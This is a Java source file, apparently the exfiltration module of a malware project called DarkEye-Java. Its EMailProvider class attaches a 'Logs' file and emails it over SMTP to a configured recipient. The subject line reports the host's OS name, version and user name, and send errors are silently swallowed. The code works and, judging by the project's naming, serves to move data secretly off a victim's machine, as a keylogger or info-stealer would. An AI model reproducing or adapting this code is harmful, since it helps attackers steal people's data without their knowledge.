package org.spray.darkeye.providers;

import java.io.File;

import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;
import org.spray.darkeye.Config;
import org.spray.darkeye.DarkEye;
import org.spray.darkeye.objects.EMailData;

public class EMailProvider {

	private File file;

	public EMailProvider(File file) {
		this.file = file;
	}

	public void run() {
		send();
	}

	private void send() {
		EMailData data = Config.FROM_DATA;
		EMailData to = Config.TO_DATA;

		EmailAttachment attachment = new EmailAttachment();
		attachment.setPath(file.getPath());
		attachment.setDisposition(EmailAttachment.ATTACHMENT);
		attachment.setDescription("Logs");
		attachment.setName(file.getName());

		try {
			MultiPartEmail email = new MultiPartEmail();
			email.setDebug(false);
			email.setSmtpPort(data.getMethod().getPort());
			email.setAuthentication(data.getEmail(), data.getPassword());
			email.setHostName(data.getMethod().getHost());

			email.addTo(to.getEmail());
			email.setFrom(data.getEmail(), "DarkEye");
			email.setAuthentication(data.getEmail(), data.getPassword());
			email.setSubject("[DARKEYE] " + System.getProperty("os.name") + System.getProperty("os.version") + " | "
					+ System.getProperty("user.name"));
			email.setMsg("[DarkEye-Java]: " + "https://github.com/SprayDown/DarkEye-Java");
			email.setSSLOnConnect(data.getMethod().isSSL());
			email.attach(attachment);
			email.send();
		} catch (EmailException e) {
			// System.out.println(e);
		}
	}

}
